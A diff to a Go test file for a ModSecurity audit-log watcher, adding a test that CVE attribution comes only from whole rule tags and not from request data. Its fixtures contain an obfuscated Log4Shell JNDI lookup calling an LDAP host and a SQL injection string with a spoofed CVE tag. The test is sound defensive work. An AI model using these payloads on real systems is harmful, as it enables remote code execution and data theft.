@@ -2,6 +2,7 @@ package modsecurity
 
 import (
 	"slices"
+	"strings"
 	"testing"
 	"time"
 )
@@ -71,5 +72,25 @@ func TestVirtualPatchCVEEveryEntry(t *testing.T) {
 	}
 	if _, ok := VirtualPatchCVE("9929999"); ok {
 		t.Error("the probe rule is not a patch")
+	}
+}
+
+// Request data in the log line must not attribute a CVE: ModSecurity escapes quotes in
+// [data], and only whole tags count (not CVE ids inside a message or a longer tag).
+func TestAuditEntryCVEsIgnoresRequestData(t *testing.T) {
+	entry := strings.Replace(vpatchAuditEntry, "[data \"${${lower:j}ndi:ldap://203.0.113.9/a}\"]",
+		`[data "q=[tag \"CVE-2099-0001\"] union select 1"]`, 1)
+	var got *AuditEntry
+	w := &AuditLogWatcher{onEvent: func(e AuditEntry) { got = &e }, recentIPs: map[string]time.Time{}}
+	w.processBuffer(&entry)
+	if got == nil {
+		t.Fatal("entry not parsed")
+	}
+	if cves := got.CVEs(); !slices.Equal(cves, []string{"CVE-2021-44228", "CVE-2021-45046"}) {
+		t.Errorf("CVEs() = %v", cves)
+	}
+	e := AuditEntry{Rules: []RuleMatch{{ID: "1", Msg: "Attack on CVE-2099-0002", Tags: []string{"attack-rce CVE-2099-0003", "CVE-2099-0004"}}}}
+	if cves := e.CVEs(); !slices.Equal(cves, []string{"CVE-2099-0004"}) {
+		t.Errorf("CVEs() = %v, want only the whole tag", cves)
 	}
 }
